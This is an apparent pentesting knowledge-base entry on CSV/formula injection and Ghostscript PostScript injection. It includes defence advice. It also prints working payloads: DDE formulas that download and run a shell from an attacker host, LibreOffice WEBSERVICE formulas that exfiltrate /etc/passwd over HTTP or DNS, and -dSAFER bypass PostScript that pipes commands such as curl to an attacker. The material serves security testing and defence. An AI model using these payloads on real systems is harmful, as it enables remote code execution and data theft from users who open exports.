---
title: "CSV Injection"
type: technique
tags: [client-side, dde, formula-injection, exploitation, web]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-15
sources: [payloadsallthethings-csv, hacktricks-web]
---

# CSV Injection

## What it is

CSV / Formula Injection: an app exports unsanitized user input into a CSV (or XLSX), and when a victim opens it in Excel/LibreOffice/Sheets, a cell beginning with a formula character executes - DDE/command execution on the victim's machine or data exfiltration. The impact lands on whoever downloads the export (often an admin). Client-side, stored-style.

## How it works / where found
Any "export to CSV/Excel" feature fed by user-controlled fields: usernames, addresses, feedback, support tickets, profile fields, log exports. A cell is treated as a formula if it starts with `= + - @` (or tab/CR before them).

## Methodology
### Formula / DDE command execution (Excel)
```text
=cmd|'/C calc'!A0
=cmd|'/C powershell IEX(wget http://attacker/shell.exe)'!A0
@SUM(1+1)*cmd|'/C calc'!A0
=rundll32|'URL.dll,OpenURL calc.exe'!A
```
### Evasion (filter bypass)
```text
=AAAA+BBBB-CCCC&"x"/1&cmd|'/c calc.exe'!A      # prefix + chaining
=    C    m D    |  '/ c  c a l c . e x e' ! A # spaces/null chars to dodge string filters
```
### Exfiltration (Google Sheets / hyperlinks)
```text
=IMPORTXML("http://attacker/?x", "//a/@href")
=HYPERLINK("http://attacker/?leak="&A1,"click")
=IMPORTDATA("http://attacker/?"&CONCAT(A1:A9))
```
`IMPORTXML/RANGE/HTML/FEED/DATA` fetch external URLs (Sheets warns the user first; Excel DDE may prompt too, but users click through).

## Real-world
A perennial bug-bounty finding on any app with CSV/Excel export; impact is RCE on the (often privileged) user who opens the report, or silent data exfil via formula fetches.

## LibreOffice Calc local file read and exfiltration

Beyond DDE and Sheets fetches, a formula rendered in LibreOffice Calc can read local files on whoever opens the sheet and exfiltrate them, which matters when a server-side pipeline converts an attacker-controlled ODS/XLSX. LibreOffice resolves `file:///` references and the `WEBSERVICE()` function performs outbound HTTP:

```text
='file:///etc/passwd'#$passwd.A1
=WEBSERVICE(CONCATENATE("http://ATTACKER:8080/",('file:///etc/passwd'#$passwd.A1)))
=WEBSERVICE(CONCATENATE("http://ATTACKER:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))
=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".ATTACKER-DOMAIN"))
```

The first line reads a single line into a cell; `WEBSERVICE` ships the read data to an attacker host (HTTP exfil), and the last variant encodes bytes into a subdomain label for DNS exfiltration when only DNS egress exists.

## Ghostscript / PostScript injection

A sibling class of document-processing injection: instead of a spreadsheet formula, the attacker supplies a crafted PostScript/EPS/PDF that a server-side pipeline renders with Ghostscript (`gs`). Ghostscript is reached indirectly by many web features that never mention it: [[latex-injection]] (`pdflatex` embeds EPS via gs), ImageMagick/GraphicsMagick delegates for EPS/PS/PDF (ImageTragick, CVE-2016-3714), thumbnailers, print pipelines, and any "upload an image/PDF, get a preview" flow. Upload a `.jpg` that is really an EPS and the converter still hands it to `gs`.

**Attack path**: find a feature that converts or previews uploaded EPS/PS/PDF, submit a file whose PostScript opens an output through the pipe device, and the interpreter runs the shell command.

Ghostscript is meant to be sandboxed by `-dSAFER` (blocks file writes and the `%pipe%` / `|command` devices), which is the default in modern builds. The bug class is repeated `-dSAFER` bypasses: a filename beginning with `|` or `%pipe%` that the interpreter treats as a command, or an operator that escapes the sandbox. Because gs is buried inside an image/PDF toolchain, this is a blind, OOB-worthy sink: point the pipe at a callback (`curl`/DNS to your host) to confirm before claiming RCE.

```postscript
%!PS
% -dSAFER pipe device -> command execution (CVE-2023-36664 class, gs < 10.01.2)
(%pipe%curl ATTACKER/x) (w) file
```

```postscript
%!PS
% CVE-2018-16509 style: restore-error -dSAFER bypass, then write to the pipe device
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

**Historical CVEs to fingerprint by `gs --version`:**

- CVE-2018-16509: `-dSAFER` bypass via failed `restore`, reaching `/OutputFile (%pipe%...)` for RCE.
- CVE-2019-6116 and the CVE-2019-1481x series: further `-dSAFER` operator bypasses (`.setuserparams`, `.libfile`, etc.).
- CVE-2021-3781: `%pipe%` `-dSAFER` bypass exploited in the wild against gs before 9.54; triggerable from an embedded EPS.
- CVE-2023-28879: buffer overflow in the interpreter.
- CVE-2023-36664: command injection via a filename starting with `|` or `%pipe%`, bypassing the pipe restriction in gs before 10.01.2 (the cleanest modern vector).

**Defence**: keep Ghostscript patched (10.01.2+), run conversions in a locked-down sandbox/container with no egress, disable the `%pipe%`/`|` pipe devices and confirm `-dSAFER` is on, and restrict which upload types reach `gs` (do not let ImageMagick delegate untrusted EPS/PS/PDF; set an ImageMagick `policy.xml` blocking those coders).

## Detection and defence
Prefix any cell starting with `= + - @` (or tab/CR/`|`/`%`) with a single quote `'` or a leading space, or wrap in quotes and escape; better, set the export `Content-Type`/extension so it is not auto-opened as a live sheet; validate/strip formula leaders server-side at export time (RFC 4180 quoting alone does NOT stop formula execution). Disable DDE in Excel via policy.

## Tools
Manual payloads + a spreadsheet app to verify; Burp to seed the field that lands in the export.

## Sources
- PayloadsAllTheThings - CSV Injection
- HackTricks - Formula/CSV/Doc/LaTeX/GhostScript Injection
